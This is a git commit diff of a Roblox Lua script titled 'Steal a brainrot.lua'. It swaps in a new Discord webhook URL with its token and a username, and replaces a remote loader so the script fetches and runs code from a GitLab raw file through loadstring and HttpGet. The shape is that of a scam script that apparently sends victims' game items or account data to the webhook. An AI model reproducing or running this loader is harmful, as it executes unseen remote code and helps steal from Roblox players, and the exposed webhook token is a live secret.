8f1b9010b7686015cf2131f4fde1837c6048c9e0
Fru1sik <fru1sik@gmail.com>
2025-08-17 17:25:33 +0500

    Update Steal a brainrot.lua

--- Steal a brainrot.lua
+++ Steal a brainrot.lua
@@ -1,4 +1,4 @@
-Webhook = "https://discord.com/api/webhooks/1404163340158242936/vMBpOOQP1Ql_9QnJ9SdhuRopu6B_R15EABMD8Yx2H7e306zg8DzJzgSwneU5RRmTVx4F"
-Username = "Sgahfd1223"
+Username = "San8big"
+Webhook = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))(
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
